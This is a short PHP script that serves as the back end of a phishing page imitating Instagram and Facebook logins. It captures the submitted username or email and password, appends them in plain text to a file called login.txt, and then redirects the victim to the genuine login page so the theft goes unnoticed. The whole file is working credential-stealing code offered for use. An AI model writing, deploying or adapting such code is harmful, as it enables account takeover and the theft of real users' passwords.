<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Detect either Instagram or Facebook input names
    $user = $_POST['username'] ?? $_POST['email'] ?? 'UNKNOWN_USER';
    $pass = $_POST['password'] ?? $_POST['pass'] ?? 'UNKNOWN_PASS';

    $data = "Username: $user\nPassword: $pass\n\n";

    file_put_contents("login.txt", $data, FILE_APPEND);

    // Redirect based on origin
    if (isset($_POST['email'])) {
        header("Location: https://m.facebook.com/login");
    } else {
        header("Location: https://www.instagram.com/accounts/login/?hl=en");
    }

    exit();
}
?>
